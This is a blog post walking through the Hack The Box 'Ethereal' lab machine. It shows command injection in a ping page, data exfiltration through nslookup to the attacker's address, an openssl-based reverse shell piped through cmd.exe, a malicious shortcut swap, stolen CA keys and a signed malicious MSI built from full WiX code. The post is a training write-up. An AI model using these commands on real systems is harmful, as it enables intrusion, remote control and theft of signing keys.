<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - Ethereal | 0xRick</title>
<meta name="generator" content="Jekyll v3.8.5" />
<meta property="og:title" content="Hack The Box - Ethereal" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="My write-up / walkthrough for Ethereal from Hack The Box." />
<meta property="og:description" content="My write-up / walkthrough for Ethereal from Hack The Box." />
<link rel="canonical" href="https://0xrick.github.io/hack-the-box/ethereal/" />
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/ethereal/" />
<meta property="og:site_name" content="0xRick" />
<meta property="og:image" content="https://0xrick.github.io/hackthebox/ethereal/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-03-09T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"My write-up / walkthrough for Ethereal from Hack The Box.","@type":"BlogPosting","url":"https://0xrick.github.io/hack-the-box/ethereal/","image":"https://0xrick.github.io/hackthebox/ethereal/0.png","headline":"Hack The Box - Ethereal","dateModified":"2019-03-09T00:00:00+02:00","datePublished":"2019-03-09T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xrick.github.io/hack-the-box/ethereal/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="https://0xrick.github.io/feed.xml" title="0xRick" /><script defer src="https://use.fontawesome.com/releases/v5.8.1/js/all.js" integrity="sha384-g5uSoOSBd7KkhAMlnQILrecXvzst9TdC09/VM+pjDTCM+1il8RHz5fKANTFFb+gQ" crossorigin="anonymous"></script>
</head><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">0xRick<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color-cyan-hover" href="https://twitter.com/Ahm3d_H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-twitter"></i></a><a class="color-blue-hover" href="https://facebook.com/Ahm3d.H3sham/" target="_blank" rel="noopener noreferrer"><i class="fab fa-facebook"></i></a><a class="color-purple-hover" href="https://github.com/0xRick" target="_blank" rel="noopener noreferrer"><i class="fab fa-github"></i></a><a class="color-orange-hover" href="https://www.reddit.com/user/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer"><i class="fab fa-reddit"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/332196573771595777" target="_blank" rel="noopener noreferrer"><i class="fab fa-discord"></i></a>
        <a class="color-red-hover" href="mailto:x0rick@protonmail.com"><i class="fa fa-envelope"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="author-box">
<img src="/avatar.png" class="author-avatar" onclick="window.open('https://www.hackthebox.eu/profile/65598','_blank');">
<h7>
	Ahmed Hesham<br>
	CyberSec/InfoSec enthusiast. <br>
	Interested in knowing how things work/Interested in breaking them, always learning.
</h7>
</div>

  <br>
<div>
	<h7>    Ad </h7>
	<script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script>
</div>
<div class="post">
  <h1 class="post-title">Hack The Box - Ethereal</h1>
  
  <div class="post-tags">
      
      <a class="tag" href="/tag/windows/">windows</a>
      
      <a class="tag" href="/tag/ftp/">ftp</a>
      
      <a class="tag" href="/tag/web/">web</a>
      
      <a class="tag" href="/tag/rce/">rce</a>
      
      <a class="tag" href="/tag/windows-exploitation/">windows-exploitation</a>
      
      <a class="tag" href="/tag/firewall/">firewall</a>
      
      <a class="tag" href="/tag/networking/">networking</a>
      
  </div>
  
  <div class="post-date">Published on 09 Mar 2019</div>
  
  <div class="post-description">My write-up / walkthrough for Ethereal from Hack The Box.</div>
  
  <hr>

<h2 id="quick-summary">Quick Summary</h2>
<p><br> Hey guys today Ethereal retired and here is my write-up about it. And as the difficulty says , It’s insane ! The most annoying part about this box is that it was very hard to enumerate because we only get a blind RCE and the firewall rules made it even harder because it only allowed TCP connection for 2 ports. It was fun and annoying at the same time but I liked it. It’s a Windows box and its ip is 10.10.10.106 I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ethereal.htb</code> , Let’s jump right in !
<br><img src="/images/hackthebox/ethereal/0.png" alt=""><br></p>
<hr>

<h2 id="nmap">Nmap</h2>
<p><br> As always we will start with nmap to scan for open ports and services : 
<br><code class="highlighter-rouge">nmap -sV -sT -sC ethereal.htb</code>
<br><img src="/images/hackthebox/ethereal/1.png" alt=""><br>
<br> And we get FTP on port 21 , HTTP on port 80 and 8080. It also tells us that FTP anonymous authentication is allowed. As always we will enumerate HTTP first.
<br></p>
<hr>

<h2 id="http-initial-enumeration">HTTP Initial Enumeration</h2>
<p><br> On port 80 we see this website :
<br><img src="/images/hackthebox/ethereal/2.png" alt=""><br>
<br> The only interseting thing is in the menu we see an Admin-area :
<br><img src="/images/hackthebox/ethereal/3.png" alt=""><br>
<br> Clicking on that we get redirected to this page which has some other options like Notes , Messages , Desktop and Ping :
<br><img src="/images/hackthebox/ethereal/4.png" alt=""><br>
<br> By going to <code class="highlighter-rouge">notes</code> we only get this :
<br><img src="/images/hackthebox/ethereal/5.png" alt=""><br>
<br> So now we know that there’s a “test connection” page somewhere , we also get a potential username <code class="highlighter-rouge">alan</code>. By clicking on <code class="highlighter-rouge">messages</code> we get nothing , but <code class="highlighter-rouge">desktop</code> :
<br><img src="/images/hackthebox/ethereal/6.png" alt=""><br>
<br> And it’s very clear that this is fake , also the user.txt is a troll :
<br><img src="/images/hackthebox/ethereal/7.png" alt=""><br>
<br> By clicking on <code class="highlighter-rouge">ping</code> we get redirected to port 8080 which asks us for authentication and it uses http basic auth :
<br><img src="/images/hackthebox/ethereal/8.png" alt=""><br>
<br> So now we know what’s on port 8080 , the “Test Connection” page. But we need credentials to access it.
<br> One more thing to check is sub directory enumeration with gobsuter or any alternative :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster -u http://ethereal.htb -w /usr/share/wordlists/dirb/common.txt -t 100 -to 250s 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://ethereal.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 4m10s
=====================================================
2019/03/06 21:51:24 Starting gobuster
=====================================================
/corp (Status: 301)
</code></pre></div></div>
<p><br> gobuster only found <code class="highlighter-rouge">/corp</code> with the wordlist <code class="highlighter-rouge">/usr/share/wordlists/dirb/common.txt</code> and that’s the subdirectory that had the admin stuff. We can’t get any more info and there’s nothing to exploit so next thing to look at is FTP
<br></p>
<hr>

<h2 id="ftp-enumeration">FTP Enumeration</h2>
<p><br> On FTP there are some files but the most interesting ones are <code class="highlighter-rouge">FDISK.zip</code> and <code class="highlighter-rouge">DISK.zip</code> so we will check them first :
<br><img src="/images/hackthebox/ethereal/9.png" alt=""><br>
<br> We will <code class="highlighter-rouge">unzip</code> them :
<br><img src="/images/hackthebox/ethereal/10.png" alt=""><br>
<br> Then we will check what kind of files do we have with <code class="highlighter-rouge">file</code> :
<br><img src="/images/hackthebox/ethereal/11.png" alt=""><br>
<br> Most likely they are mountable disks so we will create a directory to mount them and call it <code class="highlighter-rouge">mnt</code> then we will make a directory for <code class="highlighter-rouge">disk1</code> , <code class="highlighter-rouge">disk2</code> and <code class="highlighter-rouge">fdisk</code> and finally we will mount them <code class="highlighter-rouge">mount -o loop [Disk] [Directory]</code> : 
<br><img src="/images/hackthebox/ethereal/12.png" alt=""><br>
<br> In <code class="highlighter-rouge">disk1</code> and <code class="highlighter-rouge">disk2</code> there are some files that are not very interesting :
<br><img src="/images/hackthebox/ethereal/13.png" alt=""><br>
<br><img src="/images/hackthebox/ethereal/14.png" alt=""><br>
<br> But on fdisk there’s a directory called <code class="highlighter-rouge">pbox</code> :
<br><img src="/images/hackthebox/ethereal/15.png" alt=""><br>
<br> It contains an executable called <code class="highlighter-rouge">pbox.exe</code> and a dat file called <code class="highlighter-rouge">pbox.dat</code> :
<br><img src="/images/hackthebox/ethereal/16.png" alt=""><br></p>
<hr>

<h2 id="getting-credentials">Getting Credentials</h2>
<p><br> We will switch to a windows box to run that executable , you can alternatively use <code class="highlighter-rouge">wine</code> or a program called <code class="highlighter-rouge">dosbox</code>. <code class="highlighter-rouge">wine</code> didn’t work for me and <code class="highlighter-rouge">dosbox</code> kept crashing every 15 seconds.
<br><img src="/images/hackthebox/ethereal/17.png" alt=""><br>
<br> When we try to open it it asks for a password : 
<br><img src="/images/hackthebox/ethereal/18.png" alt=""><br>
<br> At this point the only option I had was to guess the password because I didn’t know how to bruteforce the password in this case , however the password was “password” :D , so no bruteforce is needed it’s only a quick guess , after we get in , we see this password database :
<br><img src="/images/hackthebox/ethereal/19.png" alt=""><br>
<br> databases :
<br><img src="/images/hackthebox/ethereal/20.png" alt=""><br>
<br> msdn :
<br><img src="/images/hackthebox/ethereal/21.png" alt=""><br>
<br> learning :
<br><img src="/images/hackthebox/ethereal/22.png" alt=""><br>
<br> ftp drop :
<br><img src="/images/hackthebox/ethereal/23.png" alt=""><br>
<br> backup :
<br><img src="/images/hackthebox/ethereal/24.png" alt=""><br>
<br> website uploads :
<br><img src="/images/hackthebox/ethereal/25.png" alt=""><br>
<br> truecrypt :
<br><img src="/images/hackthebox/ethereal/26.png" alt=""><br>
<br> management server :
<br><img src="/images/hackthebox/ethereal/27.png" alt=""><br>
<br> svn : 
<br><img src="/images/hackthebox/ethereal/28.png" alt=""><br>
<br> Back to our kali , now we can create a list with all the information we got :
<br><img src="/images/hackthebox/ethereal/29.png" alt=""><br>
<br> I put the passwords in a separate list to bruteforce the http auth with it :
<br><img src="/images/hackthebox/ethereal/30.png" alt=""><br>
<br> We will use <code class="highlighter-rouge">wfuzz</code> and we will try the username <code class="highlighter-rouge">alan</code> first :
<code class="highlighter-rouge">wfuzz -u http://ethereal.htb:8080 --basic alan:FUZZ -w passwords.txt</code>
<br><img src="/images/hackthebox/ethereal/31.png" alt=""><br>
<br> Password : <code class="highlighter-rouge">!C414m17y57r1k3s4g41n!</code>
<br></p>
<hr>

<h2 id="blind-rce">Blind RCE</h2>
<p><br> Now after we login we get the “Test Connection” page and we have an input for the ip address to ping. 
<br><img src="/images/hackthebox/ethereal/32.png" alt=""><br>
<br> Now we can try to bypass that and inject system commands using <code class="highlighter-rouge">&amp;</code> or <code class="highlighter-rouge">|</code> , but we don’t get any output. I also tried to host <code class="highlighter-rouge">nc.exe</code> on a python http server and used <code class="highlighter-rouge">certutil</code> to download it but the python server didn’t get any requests. Finally when I ran responder :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>responder -I tun0` then did this `10.10.xx.xx &amp; nslookup test 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/33.png" alt=""><br>
<br> I finally got something :
<br><img src="/images/hackthebox/ethereal/34.png" alt=""><br>
<br> We can try to execute a system command and get the output by doing this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('whoami') do nslookup %i 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/35.png" alt=""><br>
<br> This is executing <code class="highlighter-rouge">whoami</code> then taking the output and doing nslookup with the output to our ip :
<br><img src="/images/hackthebox/ethereal/36.png" alt=""><br>
<br> We get <code class="highlighter-rouge">etherealalan</code> and that’s unusual as we expected <code class="highlighter-rouge">ethereal\alan</code>.
<br> We will start enumerating the filesystem this way , <a href="https://ss64.com/nt/for_f.html" target="_blank" rel="noopener noreferrer">read this</a> if you don’t understand some of the <code class="highlighter-rouge">for</code> commands that we will use.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f %i in ('cd') do nslookup %i 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/37.png" alt=""><br>
<br>
<br>
<br><img src="/images/hackthebox/ethereal/38.png" alt=""><br>
<br> So the current directory is <code class="highlighter-rouge">c:\windows\system32\inetsrv</code>
<br> We also need to know the users on the box :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/39.png" alt=""><br>
<br> We have 5 users on the box <code class="highlighter-rouge">alan</code> , <code class="highlighter-rouge">jorge</code> , <code class="highlighter-rouge">Public</code> , <code class="highlighter-rouge">rupal</code> and <code class="highlighter-rouge">Administrator</code>. We are executing commands as <code class="highlighter-rouge">alan</code>
<br> Next thing to look at is the installed programs :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/40.png" alt=""><br>
<br> We notice that OpenSSL is installed which is unusual , we also need to know why can’t we make the box connect back to us so we will check the firewall rules. In our case the easiest way to do this is to execute the command and only look for the string <code class="highlighter-rouge">Rule Name:</code> then redirect that output to a file , and read that file like we  are doing. But first we need to find a place that we can write to. After some attempts I could write to <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> , so we will do this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; netsh advfirewall firewall show rule name=all | findstr "Rule Name:" &gt; C:\Users\Public\Desktop\Shortcuts\firewall.txt
</code></pre></div></div>
<p><br> Then we will list the contents of <code class="highlighter-rouge">c:\users\public\desktop\shortcuts</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Users\Public\Desktop\Shortcuts"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/41.png" alt=""><br>
<br> And we see that we have successfully written into that directory , next step is to read the file :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3,4,5,6,7" %a in ('type C:\Users\Public\Desktop\Shortcuts\firewall.txt') do nslookup %a.%b.%c.%d.%e.%f.%g 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/42.png" alt=""><br>
<br> It’s only allowing TCP conections to port <code class="highlighter-rouge">73</code> and <code class="highlighter-rouge">136</code> , we saw earlier that openssl was installed on the box , we can create a <code class="highlighter-rouge">SSL/TLS server</code> on these ports and use openssl to make the box connect back to us.
<br></p>
<hr>

<h2 id="generating-certs-and-setting-up-the-server">Generating certs and setting up the server</h2>
<p><br> First step is to generate certificates because we need them to set up the server :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out certificate.pem -days 365 -nodes
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/43.png" alt=""><br>
<br> Then we will split our terminal and run 2 servers , one on port 73 and the other on port 136 :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl s_server -key key.pen -cert certificate.pem -quiet -port [port]
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/44.png" alt=""><br>
<br> <a href="https://www.openssl.org/docs/man1.0.2/man1/openssl-s_server.html" target="_blank" rel="noopener noreferrer">Read more about s_server</a>
<br> We are setting up 2 servers because we are going to use openssl on the box to connect on port 73 and take our input , then we will pipe that input to cmd.exe then we will pipe the output to our server on port 136.
<br> Now we need to locate openssl.exe , if we listed the contents of <code class="highlighter-rouge">OpenSSL-v1.1.0</code> in <code class="highlighter-rouge">Program Files (x86)</code> (can also be written <code class="highlighter-rouge">Progra~2</code>. check <a href="https://stackoverflow.com/questions/892555/how-do-i-specify-c-program-files-without-a-space-in-it-for-programs-that-cant/892568" target="_blank" rel="noopener noreferrer">this</a>) we will get this output :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx &amp; for /f "tokens=1,2,3" %a in ('dir /B "C:\Program Files (x86)\OpenSSL-v1.1.0"') do nslookup %a.%b.%c 10.10.xx.xx
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/45.png" alt=""><br>
<br> We see a directory called <code class="highlighter-rouge">bin</code> that’s where <code class="highlighter-rouge">openssl.exe</code> is located so the path is <code class="highlighter-rouge">c:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe</code>
<br> Now everything is ready , in the ping page we will write this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:73 | cmd.exe | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136
</code></pre></div></div>
<p><br> Then we will check our server :
<br><img src="/images/hackthebox/ethereal/46.png" alt=""><br>
<br> Now we will write the commands on the first server (port 73) , then we will refresh the ping page , to send the post request again (this will pipe our input from port 73 to cmd.exe then to the server on port 136) then we will get our output on the second server.
<br><img src="/images/hackthebox/ethereal/47.png" alt=""><br>
<br><img src="/images/hackthebox/ethereal/48.png" alt=""><br>
<br><img src="/images/hackthebox/ethereal/49.png" alt=""><br>
<br> alan’s desktop doesn’t have the flag so we need to escalate to another user , there’s a note on alan’s desktop in a file called <code class="highlighter-rouge">note-draft.txt</code>:
<br><img src="/images/hackthebox/ethereal/50.png" alt=""><br></p>
<hr>

<h2 id="creating-a-malicious-lnk-and-getting-user">Creating a malicious lnk and getting User</h2>
<p><br><img src="/images/hackthebox/ethereal/51.png" alt=""><br>
<br> From the note we knew that there’s a lnk on Public’s desktop and other users on the box are using it.
<br><img src="/images/hackthebox/ethereal/52.png" alt=""><br>
<br> So if we replaced it with a payload we can get a shell as another user. There’s a tool on github called <a href="https://github.com/Plazmaz/LNKUp" target="_blank" rel="noopener noreferrer">LNKup</a> I used it to create the payload :
<br><img src="/images/hackthebox/ethereal/53.png" alt=""><br>
<br> To uplaod it we will close any one of the servers and run it again but this time we will redirect the lnk file to it :
<br><img src="/images/hackthebox/ethereal/54.png" alt=""><br>
<br> Then on the ping page we will type this :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.xx.xx | "C:\Program Files (x86)\OpenSSL-v1.1.0\bin\openssl.exe" s_client -quiet -connect 10.10.xx.xx:136 &gt; "C:\Users\Public\Desktop\Shortcuts\rick.lnk"
</code></pre></div></div>
<p><br> We will close the server , run the 2 servers and get our shell as alan like we did before , then we will delete the original lnk and copy ours with the name of the old <code class="highlighter-rouge">lnk</code> :
<br><img src="/images/hackthebox/ethereal/55.png" alt=""></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; copy "c:\users\public\desktop\shortcuts\rick.lnk" "c:\users\public\desktop\shortcuts\Visual Studio 2017.lnk" &amp; dir c:\users\public\desktop\shortcuts
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/56.png" alt=""><br>
<br> Then we will close the 2 servers , run them again and wait for someone to execute the lnk file , after a minute we will get a shell as jorge :
<br><img src="/images/hackthebox/ethereal/57.png" alt=""><br>
<br> With this we don’t need to refresh any pages because the connection is not handled by the ping page anymore so the command will be piped immediately from the first server to the second server.
<br><img src="/images/hackthebox/ethereal/58.png" alt=""><br>
<br> Finally we owned user !
<br></p>
<hr>

<h2 id="more-filesystem-enumeration">More Filesystem Enumeration</h2>
<p><br> If we checked the other drives : 
<code class="highlighter-rouge">fsutil fsinfo drives</code>
<br><img src="/images/hackthebox/ethereal/59.png" alt=""><br>
<br> We will find that <code class="highlighter-rouge">C</code> is not the only drive and there’s also <code class="highlighter-rouge">D</code>.
<br> Unfortunately if someone started to enumerate without doing this important step in windows enumeration , they won’t get anything.
<br> Contents of <code class="highlighter-rouge">D</code>:
<br><img src="/images/hackthebox/ethereal/60.png" alt=""><br>
<br> In <code class="highlighter-rouge">DEV</code> there’s a directory called <code class="highlighter-rouge">MSIs</code> and it has a note :
<br><img src="/images/hackthebox/ethereal/61.png" alt=""><br>
<br> So we have to create a malicious msi and place it there to get a shell as rupal. We also need to get the certs to sign the msi , the certs are found in <code class="highlighter-rouge">D:\Certs</code> , <code class="highlighter-rouge">MyCA.cer</code> and <code class="highlighter-rouge">MyCA.pvk</code> , to transfer them to our box we will use <code class="highlighter-rouge">openssl</code> to base64 encode the certs then we can copy and decode on our box.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.cer
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/62.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\progra~2\OpenSSL-v1.1.0\bin\openssl.exe base64 -in MyCA.pvk
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/63.png" alt=""><br>
<br> Now we will go to a windows box again to create the msi 
<br></p>
<hr>

<h2 id="creating-malicious-msi-and-getting-root">Creating Malicious msi and getting root</h2>
<p><br> In order to create the msi we will use <a href="http://wixtoolset.org/" target="_blank" rel="noopener noreferrer">wixtools</a> , you can use other msi builders but they didn’t work for me.
<br> Check <a href="https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with" target="_blank" rel="noopener noreferrer">this page</a> for some wix msi usage examples.
<br> We will create an msi that executes our lnk file :
<br><img src="/images/hackthebox/ethereal/64.png" alt=""><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
<span class="nt">&lt;Wix</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/wix/2006/wi"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Product</span> <span class="na">Id=</span><span class="s">"*"</span> <span class="na">UpgradeCode=</span><span class="s">"12345678-1234-1234-1234-111111111111"</span> <span class="na">Name=</span><span class="s">"Example Product Name"</span>
<span class="na">Version=</span><span class="s">"0.0.1"</span> <span class="na">Manufacturer=</span><span class="s">"@_xpn_"</span> <span class="na">Language=</span><span class="s">"1033"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Package</span> <span class="na">InstallerVersion=</span><span class="s">"200"</span> <span class="na">Compressed=</span><span class="s">"yes"</span> <span class="na">Comments=</span><span class="s">"Windows Installer Package"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Media</span> <span class="na">Id=</span><span class="s">"1"</span> <span class="na">Cabinet=</span><span class="s">"product.cab"</span> <span class="na">EmbedCab=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"TARGETDIR"</span> <span class="na">Name=</span><span class="s">"SourceDir"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"ProgramFilesFolder"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Directory</span> <span class="na">Id=</span><span class="s">"INSTALLLOCATION"</span> <span class="na">Name=</span><span class="s">"Example"</span><span class="nt">&gt;</span>
<span class="nt">&lt;Component</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span> <span class="na">Guid=</span><span class="s">"12345678-1234-1234-1234-222222222222"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/Component&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;/Directory&gt;</span>
<span class="nt">&lt;Feature</span> <span class="na">Id=</span><span class="s">"DefaultFeature"</span> <span class="na">Level=</span><span class="s">"1"</span><span class="nt">&gt;</span>
<span class="nt">&lt;ComponentRef</span> <span class="na">Id=</span><span class="s">"ApplicationFiles"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Feature&gt;</span>
<span class="nt">&lt;Property</span> <span class="na">Id=</span><span class="s">"cmdline"</span><span class="nt">&gt;</span>cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"<span class="nt">&lt;/Property&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage1"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Directory=</span><span class="s">"TARGETDIR"</span> <span class="na">ExeCommand=</span><span class="s">'[cmdline]'</span> <span class="na">Return=</span><span class="s">"ignore"</span>
<span class="na">Impersonate=</span><span class="s">"yes"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;CustomAction</span> <span class="na">Id=</span><span class="s">"Stage2"</span> <span class="na">Execute=</span><span class="s">"deferred"</span> <span class="na">Script=</span><span class="s">"vbscript"</span> <span class="na">Return=</span><span class="s">"check"</span><span class="nt">&gt;</span>
fail_here
<span class="nt">&lt;/CustomAction&gt;</span>
<span class="nt">&lt;InstallExecuteSequence&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage1"</span> <span class="na">After=</span><span class="s">"InstallInitialize"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;Custom</span> <span class="na">Action=</span><span class="s">"Stage2"</span> <span class="na">Before=</span><span class="s">"InstallFiles"</span><span class="nt">&gt;&lt;/Custom&gt;</span>
<span class="nt">&lt;/InstallExecuteSequence&gt;</span>
<span class="nt">&lt;/Product&gt;</span>
<span class="nt">&lt;/Wix&gt;</span> 
</code></pre></div></div>
<p><br> We will use <code class="highlighter-rouge">candle.exe</code> from wixtools to create a wixobject from <code class="highlighter-rouge">msi.xml</code>
<br><img src="/images/hackthebox/ethereal/65.png" alt=""><br>
<br> Then we will use <code class="highlighter-rouge">light.exe</code> to create the msi file from the wixobject 
<br><img src="/images/hackthebox/ethereal/66.png" alt=""><br>
<br> After that we need tools from microsoft sdk to sign our msi , first we will use <code class="highlighter-rouge">makecert.exe</code> to create new certs from the original certs we got from the box</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert.exe -n "CN=Ethereal" -pe -cy end -ic c:\tmp\MyCA.cer -iv c:\tmp\MyCA.pvk -sky signature -sv c:\tmp\rick.pvk c:\tmp\rick.cer
</code></pre></div></div>
<p><br> It will ask for a password we will leave it blank for no password protection :
<br><img src="/images/hackthebox/ethereal/67.png" alt=""><br>
<br><img src="/images/hackthebox/ethereal/68.png" alt=""><br>
<br><img src="/images/hackthebox/ethereal/69.png" alt=""><br>
<br> Then we will use <code class="highlighter-rouge">pvk2pfx.exe</code> to create a pfx for both the cer and the pvk files :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pvk2pfx.exe -pvk c:\tmp\rick.pvk -spc c:\tmp\rick.cer -pfx c:\tmp\rick.pfx
</code></pre></div></div>
<p><br> And finally we will use <code class="highlighter-rouge">signtool.exe</code> to sign the msi with the pfx :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool.exe sign /f c:\tmp\rick.pfx c:\tmp\ethereal\rick.msi
</code></pre></div></div>
<p><br><img src="/images/hackthebox/ethereal/70.png" alt=""><br>
<br> Now back to our kali we will upload the msi the same way we uploaded the lnk file before , and we also need to make sure that the lnk file is in <code class="highlighter-rouge">c:\users\public\desktop\shortcuts\</code> because the msi is just executing that lnk. We will put the msi into <code class="highlighter-rouge">D:\DEV\MSIs</code>
<br><img src="/images/hackthebox/ethereal/71.png" alt=""><br>
<br> Then we will close the servers , run them again and wait for around 3-5 minutes until rupal opens the msi
<br><img src="/images/hackthebox/ethereal/72.png" alt=""><br>
<br> And we got root !
<br>
<br>
<br> That’s it , Feedback is appreciated !
<br> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br> Thanks for reading.
<br>
<br>
<br> Previous Hack The Box write-up : <a href="/hack-the-box/access/">Hack The Box - Access</a>
<br> Next Hack The Box write-up : <a href="/hack-the-box/carrier/">Hack The Box - Carrier</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/heist/">
            Hack The Box - Heist
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/chainsaw/">
            Hack The Box - Chainsaw
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/ctfs/egctf-qual/">
            EGCTF 2019 - Qualification Round
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
